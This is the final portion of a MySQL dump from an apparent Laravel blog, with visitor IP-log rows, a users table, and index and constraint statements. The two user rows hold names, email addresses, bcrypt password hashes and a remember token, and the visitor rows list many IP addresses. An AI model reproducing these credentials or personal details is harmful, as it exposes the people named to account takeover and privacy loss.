(723, '140.213.19.126', '2020-09-25 10:08:42', NULL),
(724, '182.1.83.138', '2020-09-25 15:06:10', NULL),
(725, '209.17.96.234', '2020-09-25 15:22:22', NULL),
(726, '209.17.96.242', '2020-09-25 16:52:06', NULL),
(727, '54.36.148.210', '2020-09-25 23:33:41', NULL),
(728, '173.252.111.120', '2020-09-26 02:14:34', NULL),
(729, '66.249.66.157', '2020-09-26 04:10:30', NULL),
(730, '66.249.66.156', '2020-09-26 08:58:58', NULL),
(731, '125.160.66.176', '2020-09-26 09:28:54', NULL),
(732, '140.213.56.47', '2020-09-26 11:01:53', NULL),
(733, '182.0.140.12', '2020-09-26 11:51:15', NULL),
(734, '52.184.229.115', '2020-09-26 13:07:41', NULL),
(735, '185.117.154.235', '2020-09-26 13:35:08', NULL),
(736, '54.36.148.19', '2020-09-26 14:02:19', NULL),
(737, '66.249.71.83', '2020-09-26 18:42:11', NULL),
(738, '46.45.185.174', '2020-09-26 19:33:38', NULL),
(739, '49.144.141.151', '2020-09-26 19:52:59', NULL),
(740, '77.74.177.114', '2020-09-26 20:11:35', NULL),
(741, '138.246.253.15', '2020-09-26 23:08:04', NULL),
(742, '208.80.194.42', '2020-09-27 02:06:41', NULL),
(743, '66.249.71.81', '2020-09-27 03:11:31', NULL),
(744, '66.249.71.79', '2020-09-27 03:11:37', NULL),
(745, '161.35.124.51', '2020-09-27 03:35:55', NULL),
(746, '54.36.149.2', '2020-09-27 06:53:37', NULL),
(747, '141.0.8.233', '2020-09-27 07:31:46', NULL),
(748, '140.213.22.173', '2020-09-27 08:42:19', NULL),
(749, '103.105.34.88', '2020-09-27 08:43:02', NULL),
(750, '209.17.97.10', '2020-09-27 11:07:40', NULL),
(751, '69.171.251.1', '2020-09-27 11:58:39', NULL),
(752, '69.171.251.111', '2020-09-27 11:58:40', NULL),
(753, '182.1.114.31', '2020-09-27 12:42:57', NULL),
(754, '202.57.28.71', '2020-09-27 15:20:46', NULL),
(755, '207.244.230.205', '2020-09-27 21:42:45', NULL),
(756, '66.249.68.81', '2020-09-28 01:39:30', NULL),
(757, '66.249.68.79', '2020-09-28 01:40:19', NULL),
(758, '54.36.148.66', '2020-09-28 02:05:29', NULL),
(759, '66.249.71.83', '2020-09-28 03:38:59', NULL),
(760, '66.249.71.81', '2020-09-28 04:13:38', NULL),
(761, '110.137.100.194', '2020-09-28 08:45:41', NULL),
(762, '52.231.152.188', '2020-09-28 10:00:43', NULL),
(763, '115.178.248.102', '2020-09-28 12:13:25', NULL),
(764, '191.7.217.128', '2020-09-28 13:35:28', NULL),
(765, '115.178.248.31', '2020-09-28 16:47:26', NULL),
(766, '3.81.245.94', '2020-09-28 16:56:57', NULL),
(767, '140.213.54.52', '2020-09-28 18:04:23', NULL),
(768, '209.58.151.106', '2020-09-28 18:33:06', NULL),
(769, '23.108.4.144', '2020-09-28 18:33:09', NULL),
(770, '54.36.148.136', '2020-09-28 18:50:06', NULL),
(771, '3.249.9.192', '2020-09-28 21:12:46', NULL),
(772, '54.36.149.99', '2020-09-29 10:45:38', NULL),
(773, '180.254.54.214', '2020-09-29 14:23:29', NULL),
(774, '54.36.149.46', '2020-09-30 01:27:14', NULL),
(775, '36.74.46.205', '2020-09-30 04:03:57', NULL),
(776, '66.249.79.147', '2020-09-30 13:20:00', NULL),
(777, '36.71.236.235', '2020-09-30 14:01:11', NULL),
(778, '66.220.149.23', '2020-09-30 14:14:23', NULL),
(779, '66.220.149.38', '2020-09-30 14:14:23', NULL),
(780, '66.220.149.11', '2020-09-30 14:14:33', NULL),
(781, '66.220.149.29', '2020-09-30 14:14:35', NULL),
(782, '140.213.17.94', '2020-09-30 14:24:52', NULL),
(783, '125.162.217.137', '2020-09-30 16:50:27', NULL),
(784, '114.142.172.30', '2020-09-30 17:29:00', NULL),
(785, '54.36.148.241', '2020-09-30 18:49:20', NULL),
(786, '18.236.221.231', '2020-09-30 23:16:32', NULL),
(787, '157.55.39.95', '2020-10-01 00:36:53', NULL),
(788, '36.70.5.94', '2020-10-01 02:48:46', NULL),
(789, '66.249.68.81', '2020-10-01 04:42:39', NULL),
(790, '125.161.130.40', '2020-10-01 07:55:09', NULL),
(791, '54.36.149.36', '2020-10-01 08:42:59', NULL),
(792, '209.17.96.26', '2020-10-01 08:55:52', NULL),
(793, '209.17.96.250', '2020-10-01 10:06:54', NULL),
(794, '114.79.23.105', '2020-10-01 11:01:18', NULL),
(795, '36.73.87.205', '2020-10-01 14:08:43', NULL),
(796, '103.122.67.241', '2020-10-01 15:12:01', NULL),
(797, '66.249.68.79', '2020-10-01 15:29:25', NULL),
(798, '66.249.71.79', '2020-10-01 17:09:53', NULL),
(799, '40.77.167.19', '2020-10-01 21:17:07', NULL),
(800, '54.36.148.245', '2020-10-01 22:56:40', NULL),
(801, '62.210.83.78', '2020-10-02 02:38:41', NULL),
(802, '66.249.68.83', '2020-10-02 05:30:50', NULL),
(803, '114.4.219.122', '2020-10-02 08:29:11', NULL),
(804, '103.105.33.74', '2020-10-02 08:30:27', NULL),
(805, '114.79.7.46', '2020-10-02 10:07:20', NULL),
(806, '213.159.213.137', '2020-10-02 12:13:50', NULL),
(807, '209.17.96.58', '2020-10-02 12:57:40', NULL),
(808, '54.36.149.16', '2020-10-02 14:47:50', NULL),
(809, '66.249.71.83', '2020-10-02 15:05:45', NULL),
(810, '66.249.71.81', '2020-10-02 15:50:58', NULL),
(811, '114.122.196.20', '2020-10-02 22:20:09', NULL),
(812, '52.33.165.24', '2020-10-02 23:22:11', NULL),
(813, '138.246.253.15', '2020-10-03 01:41:09', NULL),
(814, '66.249.71.79', '2020-10-03 02:55:11', NULL),
(815, '173.252.95.1', '2020-10-03 05:03:18', NULL),
(816, '54.36.148.250', '2020-10-03 06:32:47', NULL),
(817, '192.71.44.44', '2020-10-03 10:21:21', NULL),
(818, '110.136.113.76', '2020-10-03 10:36:41', NULL),
(819, '209.17.96.210', '2020-10-03 11:53:44', NULL),
(820, '180.242.213.135', '2020-10-03 13:41:52', NULL),
(821, '209.17.97.122', '2020-10-03 14:11:47', NULL),
(822, '66.249.71.81', '2020-10-03 16:41:28', NULL),
(823, '66.249.71.79', '2020-10-03 17:15:50', NULL),
(824, '66.249.71.81', '2020-10-03 20:08:18', NULL),
(825, '54.36.148.250', '2020-10-03 23:00:12', NULL),
(826, '115.178.237.178', '2020-10-03 23:32:24', NULL),
(827, '208.80.194.42', '2020-10-04 05:20:58', NULL),
(828, '192.36.70.176', '2020-10-04 09:50:34', NULL),
(829, '180.253.165.78', '2020-10-04 11:41:21', NULL),
(830, '125.163.221.214', '2020-10-04 12:20:42', NULL),
(831, '103.122.67.241', '2020-10-04 13:41:46', NULL),
(832, '51.159.18.103', '2020-10-04 19:15:15', NULL),
(833, '54.36.148.27', '2020-10-05 08:14:28', NULL),
(834, '66.249.71.79', '2020-10-05 10:41:13', NULL),
(835, '104.131.63.69', '2020-10-05 14:20:44', NULL),
(836, '5.199.238.110', '2020-10-05 20:06:49', NULL),
(837, '66.249.71.79', '2020-10-05 20:49:55', NULL),
(838, '3.81.245.94', '2020-10-05 21:59:02', NULL),
(839, '54.36.148.12', '2020-10-06 00:00:01', NULL),
(840, '209.17.96.50', '2020-10-06 06:27:40', NULL),
(841, '54.36.148.72', '2020-10-06 14:16:12', NULL),
(842, '103.105.33.77', '2020-10-06 15:07:59', NULL),
(843, '114.124.167.210', '2020-10-06 15:25:45', NULL),
(844, '199.244.88.132', '2020-10-06 17:05:02', NULL),
(845, '54.36.148.250', '2020-10-07 05:17:24', NULL),
(846, '3.81.245.94', '2020-10-07 11:08:46', NULL),
(847, '125.166.72.245', '2020-10-07 13:34:21', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `role_id` int(11) NOT NULL DEFAULT 1,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `photo` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'default.png',
  `remember_token` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `role_id`, `name`, `email`, `email_verified_at`, `password`, `photo`, `remember_token`, `created_at`, `updated_at`) VALUES
(1, 1, 'Yuda Muhtar', 'mangyuda@spektaweb.com', NULL, '$2y$10$QiVHpkyQowxidTbyqafmq.IyneqqNGd6cLGlTnxL3aLB06Pv5q3e2', 'kapten2.jpg', '0nBHSaFQRNKs8c3RBp1VMqq5jDtLNmV9oTad5xX0vdeRCPLdl0ZhrQlBJelt', '2020-08-08 12:15:59', '2020-08-08 12:19:33'),
(7, 1, 'Yuda', 'laracode125@gmail.com', NULL, '$2y$10$9ELDw62j7.fSuIdUfl5vyubzFvc5RakbmUybjgDhHJIk6psnKrFou', 'default.png', NULL, '2020-08-09 12:09:13', '2020-08-09 12:09:13');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `migrations`
--
ALTER TABLE `migrations`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `password_resets`
--
ALTER TABLE `password_resets`
  ADD KEY `password_resets_email_index` (`email`);

--
-- Indexes for table `roles`
--
ALTER TABLE `roles`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tb_category`
--
ALTER TABLE `tb_category`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tb_comment`
--
ALTER TABLE `tb_comment`
  ADD PRIMARY KEY (`id`),
  ADD KEY `tb_comment_post_foreign` (`artikel_id`);

--
-- Indexes for table `tb_contact`
--
ALTER TABLE `tb_contact`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tb_post`
--
ALTER TABLE `tb_post`
  ADD PRIMARY KEY (`id`),
  ADD KEY `tb_post_category_foreign` (`category_id`);

--
-- Indexes for table `tb_subscriber`
--
ALTER TABLE `tb_subscriber`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tb_visitor`
--
ALTER TABLE `tb_visitor`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `users_email_unique` (`email`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `migrations`
--
ALTER TABLE `migrations`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `roles`
--
ALTER TABLE `roles`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `tb_visitor`
--
ALTER TABLE `tb_visitor`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=848;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `tb_comment`
--
ALTER TABLE `tb_comment`
  ADD CONSTRAINT `tb_comment_post_foreign` FOREIGN KEY (`artikel_id`) REFERENCES `tb_post` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- Constraints for table `tb_post`
--
ALTER TABLE `tb_post`
  ADD CONSTRAINT `tb_post_category_foreign` FOREIGN KEY (`category_id`) REFERENCES `tb_category` (`id`) ON UPDATE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
